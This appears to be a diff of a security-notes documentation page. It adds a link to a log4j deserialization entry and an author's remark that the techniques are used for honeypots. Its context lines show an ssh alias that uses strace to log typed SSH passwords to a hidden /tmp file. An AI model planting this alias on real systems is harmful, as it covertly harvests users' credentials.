@@ -116,6 +116,13 @@
     </li>
 
         
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../log4j-deserialization-vuln/">log4j deserialization vuln</a>
+        
+    </li>
+
+        
     </ul>
 <li>
           
@@ -243,6 +250,9 @@
               
                 <h1 id="linux-clientserver">linux 密码记录(client/server)</h1>
 <hr />
+<blockquote>
+<p>以下我都是用来做蜜罐的</p>
+</blockquote>
 <h2 id="sshalias">记录ssh密码(alias)</h2>
 <pre><code>alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s 2048 ssh'
 </code></pre>
